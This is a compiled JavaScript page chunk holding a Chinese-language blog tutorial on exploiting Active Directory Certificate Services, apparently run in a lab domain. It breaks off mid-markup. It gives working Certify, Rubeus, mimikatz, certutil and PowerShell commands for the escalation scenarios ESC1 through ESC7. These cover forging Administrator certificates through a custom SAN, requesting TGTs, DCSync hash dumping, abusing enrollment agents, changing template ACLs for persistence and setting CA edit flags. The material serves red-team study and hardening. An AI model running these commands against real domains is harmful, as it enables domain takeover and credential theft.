import{_ as e}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as s,a,o as t}from"./app-DS0ZCcmM.js";const n={};function l(p,i){return t(),s("div",null,i[0]||(i[0]=[a(`<h1 id="adcs漏洞利用" tabindex="-1"><a class="header-anchor" href="#adcs漏洞利用"><span>ADCS漏洞利用</span></a></h1><h2 id="前言" tabindex="-1"><a class="header-anchor" href="#前言"><span>前言</span></a></h2><p>这一篇主要看下ADCS漏洞的利用，包括但不限于证书滥用，维权，提权等。内容主要还是基于白皮书以及网络上收集到的一些文章</p><h2 id="证书申请" tabindex="-1"><a class="header-anchor" href="#证书申请"><span>证书申请</span></a></h2><p>在上一篇我们讲到我们的机器如果在域内可以通过<code>certmgr.msc</code> 或通过 <code>certreq.exe</code>来进行证书的申请，但那实在是比较理想的情况，我们不一定能拥有对机器的GUI权限，因此在通过命令行进行证书申请时，我们可以使用白皮书配套的证书工具<a href="https://github.com/GhostPack/Certify" target="_blank" rel="noopener noreferrer">Certify</a></p><ul><li><p>搜索可用证书模板</p><p>上一篇已经将我们需要的证书模板定向到了User/Machine上，这两个证书模板并非是一成不变的，通过Certify来搜索可用的证书模板</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Certify.exe find /clientauth</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20231228204328718.png" alt="image-20231228204328718" tabindex="0" loading="lazy"><figcaption>image-20231228204328718</figcaption></figure></li><li><p>通过certify申请证书</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Certify.exe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> request</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /ca:ECHANGE2013.loser.com</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\l</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">oser-DC-CA</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /template:User</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># Certify.exe request /ca:CA-SERVER\\CA-NAME /template:TEMPLATE-NAME</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#要使用request功能记得将dll文件放在该工具的同一目录下</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20231228205333908.png" alt="image-20231228205333908" tabindex="0" loading="lazy"><figcaption>image-20231228205333908</figcaption></figure><p>申请后工具会提示你将该证书+私钥保存为pfx的格式</p><p>这里有两点需要注意的地方：</p><p>1.官方给出的演示将pem的文本粘贴到linux\\MacOs上保存问pem文件再重新导入</p><p>2.在生成pfx文件时如果要求输入密码，请不要输入</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20231228212214658.png" alt="image-20231228212214658" tabindex="0" loading="lazy"><figcaption>image-20231228212214658</figcaption></figure><p>现在我们可以使用该证书去申请对应用户的TGT票据了</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Rubeus.exe asktgt /user:hacker /certificate:cert.pfx</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li></ul><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240102201952926.png" alt="image-20240102201952926" tabindex="0" loading="lazy"><figcaption>image-20240102201952926</figcaption></figure><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Rubeus.exe asktgs /ticket:new.kirbi /service:cifs/ECHANGE2013.loser.com /dc:ECHANGE2013.loser.com /ptt</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>后续的工作，这个低权限的TGT对我们来说并没有什么作用。接下来介绍提权。</p><h2 id="域权限提升" tabindex="-1"><a class="header-anchor" href="#域权限提升"><span>域权限提升</span></a></h2><h3 id="场景一" tabindex="-1"><a class="header-anchor" href="#场景一"><span>场景一</span></a></h3><p>使用证书进行域提权条件比较苛刻，但这并非是不存在的，我们只需要利用管理员对模板的错误配置。</p><p>证书中的subjectAltName(SAN)用于指定证书使用者的身份，但通常这个字段值是直接从AD当中获取，如果证书在其AD对象的</p><p>mspki-certificate-name-flag属性中指定请求者是可以指定SAN，即CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT标志，则可以自定义SAN。</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104141943425.png" alt="image-20240104141943425" tabindex="0" loading="lazy"><figcaption>image-20240104141943425</figcaption></figure><p>如上图，证书模板开启这个选项，并且满足上篇文章所提的低权限注册，不需要审核等条件，我们就可以伪造管理员申请证书了。</p><p>搜索可用证书</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Certify.exe find /vulnerable</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>![屏幕截图 2024-01-04 143655](<a href="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE" target="_blank" rel="noopener noreferrer">https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/屏幕截图</a> 2024-01-04 143655.png)</p><p>通过指定SAN伪造Administrator申请证书</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Certify.exe request /ca:ECHANGE2013.loser.com\\loser-DC-CA /template:TESTMP /altname:LOSER\\Administrator</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>转换并用来申请TGT</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104144810306.png" alt="image-20240104144810306" tabindex="0" loading="lazy"><figcaption>image-20240104144810306</figcaption></figure><p>导入该票据后，我们就可以通过mimikatz进行dcsync</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104145739899.png" alt="image-20240104145739899" tabindex="0" loading="lazy"><figcaption>image-20240104145739899</figcaption></figure><h3 id="场景二" tabindex="-1"><a class="header-anchor" href="#场景二"><span>场景二</span></a></h3><p>与场景一类似，只是利用了扩展为任何目的和子CA。没有CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT标志，就无法向拟定SAN，但是这两个扩展本身来讲就比较危险。</p><p>攻击者可以将具有 Any Purpose EKU 的证书用于任何目的，这包括客户端身份验证、服务器身份验证、代码签名等。相比之下，攻击者可以使用 SubCA EKU 的证书用于任何目的也是如此，但也可以使用它来签署新证书。因此，使用 SubCA 证书，攻击者可以在新证书中指定任意 EKU 或字段。</p><p>如果 <code>TAuthCertificates</code> 对象不信任从属 CA（默认情况下不会信任），则攻击者无法创建可用于域身份验证的新证书。但是可以用来签发ADFS等服务，ADFS使用现有的 Active Directory 凭据提供 Web 登录</p><h3 id="场景三" tabindex="-1"><a class="header-anchor" href="#场景三"><span>场景三</span></a></h3><p>对于请求代理这个扩展的滥用，我们一共需要两组证书模板，一组定义了证书申请代理OID（1.3.6.1.4.1.311.20.2.1），可以代表其他主体申请其他证书模板，另一组需要允许低权限用户使用注册代理证书代表另一个用户来请求证书，并且该模板定义了一个允许域身份验证的 EKU。</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104160132560.png" alt="image-20240104160132560" tabindex="0" loading="lazy"><figcaption>image-20240104160132560</figcaption></figure><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104160154104.png" alt="image-20240104160154104" tabindex="0" loading="lazy"><figcaption>image-20240104160154104</figcaption></figure><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104160209178.png" alt="image-20240104160209178" tabindex="0" loading="lazy"><figcaption>image-20240104160209178</figcaption></figure><p>首先使用hacker注册一个TEST1的证书，并导出其包含私钥的证书。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Certify.exe request /ca:ECHANGE2013.loser.com\\loser-DC-CA /template:TESTMP /altname:LOSER\\Administrator</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>使用证书一代表administrator申请TEST2的证书</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Certify.exe request /ca:&quot;ECHANGE2013.loser.com\\loser-DC-CA&quot; /template:TEST2 /onbehalfof:LOSER\\Administrator /enrollcert:cert.pfx</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>利用证书申请TGT</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Rubeus.exe asktgt /user:Administrator /certificate:test2.pfx</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104161109991.png" alt="image-20240104161109991" tabindex="0" loading="lazy"><figcaption>image-20240104161109991</figcaption></figure><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104161159955.png" alt="image-20240104161159955" tabindex="0" loading="lazy"><figcaption>image-20240104161159955</figcaption></figure><p>成功导出hash</p><h3 id="证书模板访问控制级别配置错误-esc4" tabindex="-1"><a class="header-anchor" href="#证书模板访问控制级别配置错误-esc4"><span>证书模板访问控制级别配置错误(ESC4)</span></a></h3><p>证书模板是活动目录中的安全对象，对于域内的这些对象，通常都会关心对象的权限。如果攻击者对模板对象拥有 WriteProperty 权限，则其可以修改模板 AD 对象属性，则他们可以直接将错误配置推送到不易受攻击的模板，例如通过为允许域身份验证的模板在 <code>mspki-certificate-name-flag</code> 属性中启用 <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> 标志</p><p>通常我们关心以下权限</p><table><thead><tr><th>权限</th><th>描述</th></tr></thead><tbody><tr><td>Owner</td><td>对象所有人，可以编辑任何属性</td></tr><tr><td>Full Control</td><td>完全控制对象，可以编辑任何属性</td></tr><tr><td>WriteOwner</td><td>允许委托人修改对象的安全描述符的所有者部分</td></tr><tr><td>WriteDacl</td><td>可以修改访问控制</td></tr><tr><td>WriteProperty</td><td>可以编辑任何属性</td></tr></tbody></table><p>一般这一点用来维持权限，一个普通域用户能写入模板的情况不常见</p><p>当我们接管整个域后，可以修改模板对象的属性</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>admod -b &quot;CN=TESTMP,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=loser,DC=com&quot; &quot;msPKI-Certificate-Name-Flag::1&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104205624548.png" alt="image-20240104205624548" tabindex="0" loading="lazy"><figcaption>image-20240104205624548</figcaption></figure><p>这里列举几个常用属性</p><ul><li>msPKI-Certificates-Name-Flag -edit-&gt; ENROLLEE_SUPPLIES_SUBJECT (WriteProperty)</li><li>msPKI-Certificate-Application-Policy -add-&gt; 服务器身份验证 (WriteProperty) &lt;-即扩展策略的OID</li><li>mspki-enrollment-flag -edit-&gt; AUTO_ENROLLMENT (WriteProperty) -&gt;模板的自动注册</li><li>直接修改模板的所有者</li></ul><p>我们可以通过Certify的find命令枚举所有模板的访问控制条目</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104210937632.png" alt="image-20240104210937632" tabindex="0" loading="lazy"><figcaption>image-20240104210937632</figcaption></figure><p>可以看的出来，模板默认是不会给普通用户写权限的，都是管理员组，这也是为什么我不认为这个方法属于提权，事实上访问控制权限通常都用于维权。</p><ul><li>至此提权到维权的思路基本上能够串起来了，即使用户的密码被修改，仍能通过PAC的机制获取用户的ntlm hash,遗憾的是我们不能直接使用hash来申请证书，不过通过pth，我们仍然能伪造该用户。</li></ul><h3 id="pki缺陷-esc5" tabindex="-1"><a class="header-anchor" href="#pki缺陷-esc5"><span>PKI缺陷(ESC5)</span></a></h3><p>如果低特权的攻击者可以对 <code>CN=Public Key Services,CN=Services,CN=Configuration,DC=,DC=</code> 控制，那么攻击者就会直接控制 PKI 系统 (证书模板容器、证书颁发机构容器、NTAuthCertificates对象、注册服务容器等)。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Certify.exe pkiobjects</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240105164400145.png" alt="image-20240105164400145" tabindex="0" loading="lazy"><figcaption>image-20240105164400145</figcaption></figure><p>hacker用户对该条目拥有完全控制权，通常来拥有创建子对象和写入权限应该就可以了。</p><p>有用这些权限，我们就可以创建一个恶意模板来进行提权或者维权了。</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Import-Module</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> .\\ADCSTemplate.psm1</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Export-ADCSTemplate</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DisplayName TESTMP &gt; .</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">TESTTMP.json</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">New-ADCSTemplate</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DisplayName TMP_BACK </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">JSON (</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Get-Content</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> .\\TESTTMP.json </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Raw) </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Publish </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Identity </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;NT AUTHORITY\\Authenticated Users&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240105170924555.png" alt="image-20240105170924555" tabindex="0" loading="lazy"><figcaption>image-20240105170924555</figcaption></figure><h3 id="esc6" tabindex="-1"><a class="header-anchor" href="#esc6"><span>ESC6</span></a></h3><p>CA 的 <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> 标志,当启用这个标志时，攻击者可以为任何域用户注册证书，这与ESC1比较相似，但ESC1是利用证书模板属性的SAN自定义，这里将SAN包含在名称值对当中。</p><p>这也属于错误配置的一种，要在域上启用这个标志，可以执行</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">certutil</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -config</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;ECHANGE2013.loser.com\\loser-DC-CA&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -setreg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;policy\\EditFlags&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> +EDITF_ATTRIBUTESUBJECTALTNAME2</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">//检查是否启用该标志，这仅通过远程注册表</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg.exe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> query</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> \\\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">CA_SERVE</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">R&gt;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">KEY_LOCAL_MACHINE</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">YSTEM</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">urrentControlSet</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ervices</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ertSvc</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">onfiguration</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">CA_NAM</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">E&gt;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\P</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">olicyModules</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ertificateAuthority_MicrosoftDefault.Policy</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\ </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> EditFlags</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">certutil</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -config</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;ECHANGE2013.loser.com\\loser-DC-CA&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -getreg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;policy\\EditFlags&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240108161144609.png" alt="image-20240108161144609" tabindex="0" loading="lazy"><figcaption>image-20240108161144609</figcaption></figure><p>通过certify也能达到同样的效果</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240108161630768.png" alt="image-20240108161630768" tabindex="0" loading="lazy"><figcaption>image-20240108161630768</figcaption></figure><p>开启此标志只需要指定/altname即可有和ESC一样的效果。</p><p>注：由于安全更新，要使用ESC6则需要满足ESC10的情况，后续会介绍</p><ul><li><p>删除该标志</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>certutil -config &quot;CA_HOST\\CA_NAME&quot; -setreg &quot;policy\\EditFlags&quot; -EDITF_ATTRIBUTESUBJECTALTNAME2</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li></ul><h3 id="esc7-ca访问权限配置错误" tabindex="-1"><a class="header-anchor" href="#esc7-ca访问权限配置错误"><span>ESC7(CA访问权限配置错误)</span></a></h3><p>CA自身有一套访问操作权限，可以通过GUI来查看。</p><p>如图所示</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240108162348796.png" alt="image-20240108162348796" tabindex="0" loading="lazy"><figcaption>image-20240108162348796</figcaption></figure><p>主要关注颁发和管理证书(ManageCertificates)和管理CA(ManageCA)这两个权限，这两个权限分别对应证书管理员和CA管理员。</p><p>通过PSPKI模块可以枚举这些权限</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Import-Module</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Name PSPKI</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Get-CertificationAuthority</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">ComputerName </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">ECHANGE2013.loser.com</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Get-CertificationAuthorityAcl</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | select </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">expand Access</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>ManageCA</p><p>这个权限主要的利用思路是添加EDITF_ATTRIBUTESUBJECTALTNAME2标志，并执行ESC2。通过PSPKI，我们能够远程开启该标志，具体命令如下</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Import-Module</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> PSPKI</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$ConfigReader</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> New-Object</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;ECHANGE2013.loser.com&quot;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$ConfigReader.SetRootNode</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">$true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$ConfigReader.GetConfigEntry</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;EditFlags&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$ConfigReader.SetConfigEntry</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1376590</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">certutil </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">config </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;ECHANGE2013.loser.com\\loser-DC-CA&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">getreg </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;policy\\EditFlags&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img 